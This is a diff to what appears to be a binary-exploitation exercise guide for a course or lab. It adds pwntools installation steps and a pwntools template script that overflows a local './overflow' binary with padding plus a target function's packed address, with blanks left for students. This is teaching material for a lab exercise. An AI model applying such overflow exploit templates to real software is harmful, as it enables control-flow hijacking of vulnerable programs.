@@ -391,18 +391,52 @@ Otherwise it might not be printing anything that can be actually seen - output n
 
 ### C) Reproduce the previous with `pwntools`
 
+Install `pwntools`, if you haven't already [^14].
+```bash
+# Create virtual environment
+python -m venv venv
+# Activate it
+source venv/bin/activate
+pip install --upgrade pip
+pip install pwntools
+```
+
 At this point, we are going to move outside of `gdb`.
-GBU Debugger creates a separate memory space when the program is being executed.
+GBU Debugger creates a separate memory space where the program is being executed.
 As a result, the same address does not work when we exit the debugger.
 It also disables `ASLR` by default when it runs the program.
 We need to manually disable it globally to succeed.
 
-However, only *a small change is required for it to work outside of `gbd`*.
+In general, only *a small change is required for it to work outside of `gbd`*.
 
-We are going to brute force the address change with the help of `pwntools`.
-It is a library specifically meant for shellcoding.
+
+However, we are going calculate the address change with the help of `pwntools`, instead of brute forcing it in this case.
+It is a library specifically meant for writing exploits.
 Use following `pwntools` template to overflow the program outside of `gdb`.
 
+```python
+from pwn import *
+context.update(arch='i386', os='linux', endian='little', word_size=32)
+context.binary="./overflow"
+
+def main():
+    # Our beloved target binary
+    task_bin = ELF('./overflow')
+    # Payload to be passed into the program
+    PADDING_SIZE = '?'
+    payload = b"A" * PADDING_SIZE
+    # Get address of the function automatically!
+    secret = task_bin.symbols['?']
+    # 'I' means unsigned as integer, convert integer to hexbytes
+    payload += struct.pack('I', secret)
+    print(f'Secret address {hex(secret)}')
+    p = task_bin.process(argv=[payload])
+    print(p.recvall().decode("utf-8", "ignore"))
+    # p.interactive() # if your function spawns a shell
+
+if __name__ == "__main__":
+    main()
+```
 
 ----
 Task 3 : Defeating No-eXecute
@@ -559,3 +593,4 @@ io.interactive()
 [^11]: [Pointer Authentication on ARMv8.3](https://www.qualcomm.com/content/dam/qcomm-martech/dm-assets/documents/pointer-auth-v7.pdf)
 [^12]: [Control Flow Guard for platform security](https://learn.microsoft.com/en-us/windows/win32/secbp/control-flow-guard)
 [^13]: [RFC: Introduce -fhardened to enable security-related flags](https://gcc.gnu.org/pipermail/gcc-patches/2023-August/628748.html)
+[^14]: [pwntools - CTF toolkit](https://github.com/Gallopsled/pwntools)
